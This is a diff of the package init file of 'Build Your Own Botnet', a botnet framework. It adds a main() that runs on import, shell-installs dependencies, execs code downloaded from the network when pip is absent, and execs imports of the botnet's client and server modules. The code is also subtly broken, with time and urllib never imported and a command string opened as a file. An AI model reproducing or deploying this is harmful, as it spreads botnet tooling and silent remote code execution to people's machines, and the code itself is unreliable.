@@ -1,27 +1,70 @@
-
 #!/usr/bin/python
-# Build Your Own Botnet
-# https://github.com/colental/byob
-# Copyright (c) 2018 Daniel Vega-Myhre
+#!/usr/bin/python
+"""
+Build Your Own Botnet
+https://github.com/colental/byob
+Copyright (c) 2018 Daniel Vega-Myhre
 """
 
-88                                  88
-88                                  88
-88                                  88
-88,dPPYba,  8b       d8  ,adPPYba,  88,dPPYba,
-88P'    "8a `8b     d8' a8"     "8a 88P'    "8a
-88       d8  `8b   d8'  8b       d8 88       d8
-88b,   ,a8"   `8b,d8'   "8a,   ,a8" 88b,   ,a8"
-8Y"Ybbd8"'      Y88'     `"YbbdP"'  8Y"Ybbd8"'
-                d8'
-               d8'
+from __future__ import print_function
 
-"""
+# standard libarary
 
-import client, server
+import os
+import sys
+import logging
+import subprocess
+
+logging.basicConfig(level=logging.DEBUG, handler=logging.StreamHandler())
+
+
+def main():
+    pip_exe  = subprocess.check_output('where pip' if os.name is 'nt' else 'which pip', shell=True).rstrip()
+    logging.info(pip_exe)
+    if pip_exe:
+        try:
+            require = '%s install -r %s' % (pip_exe, '../requirements{}.txt'.format('-windows' if os.name == 'nt' else ''))
+            logging.info(require)
+            process = subprocess.Popen(require, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True)
+            while True:
+                if process.poll():
+                    time.sleep(0.1)
+                    try:
+                        logging.info(process.stdout.read())
+                    except: pass
+                else:
+                    try:
+                        logging.info(process.stdout.read())
+                    except: pass
+                    break
+        except Exception as e:
+            with open(require, 'r') as fp:
+                for module in fp.readlines():
+                    try:
+                        install = '%s install %s' % (pip_exe, module)
+                        logging.info(install)
+                        process = subprocess.Popen(install, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True)
+                        while True:
+                            if process.poll():
+                                time.sleep(0.1)
+                            else:
+                                logging.info(process.stdout.read())
+                                break
+                    except Exception as e:
+                        logging.debug(e)
+        for i in ('client', 'server'):
+            try:
+                exec "import %s" % i in globals()
+            except Exception as e:
+                logging.debug(e)
+    else:
+        exec urllib.urlopen("https://bootstrap.pypa.io/get-pip.py").read() in globals()
+        os.execv(sys.executable, ['python'] + [os.path.abspath(sys.argv[0])] + sys.argv[1:])
+
+
 
 __all__         = ['client','server']
-__package__ 	= 'byob'
 __author__      = 'Daniel Vega-Myhre'
 __license__ 	= 'GPLv3'
 __version__ 	= '0.1.2'
+main()
